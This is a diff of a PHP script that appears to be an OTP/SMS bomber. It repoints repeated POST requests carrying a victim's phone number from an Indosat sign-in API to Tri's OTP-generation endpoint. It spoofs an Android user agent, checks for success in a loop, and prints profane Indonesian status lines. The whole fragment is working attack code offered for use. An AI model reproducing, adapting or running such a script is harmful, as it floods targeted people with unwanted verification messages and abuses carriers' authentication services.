@@ -28,7 +28,7 @@ $header = array("Content-Type: application/json", "operatorId: 50e22f864fc644c08
 $post = array("msisdn" => "$target");
 $data = json_encode($post);
 $g = curl_init();
-curl_setopt($g, CURLOPT_URL, "https://osa-indosat.lotusflare.com/api/1.0/dcp/user/indosat_begin_sign_in");
+curl_setopt($g, CURLOPT_URL, "https://registrasi.tri.co.id/ulang/generateOTP");
 curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($g, CURLOPT_POST, 1);
 curl_setopt($g, CURLOPT_HEADER, 1);
@@ -38,8 +38,8 @@ curl_setopt($g, CURLOPT_USERAGENT, "Dalvik/2.1.0 (Linux; U; Android 6.0.1; ASUS_
 $h = curl_exec($g);
 curl_close($g);
 
-preg_match("/challengeId/i", $h, $respon);
-if ($respon[0] == "challengeId") {
+$json = json_decode($h);
+        if($json->code == "200" && $json->status == "success"){
 	echo $i. ".Gass Terus Cok !!!\n";
 	}else{
 		echo $i. ".Gagal bangsat:(\n";
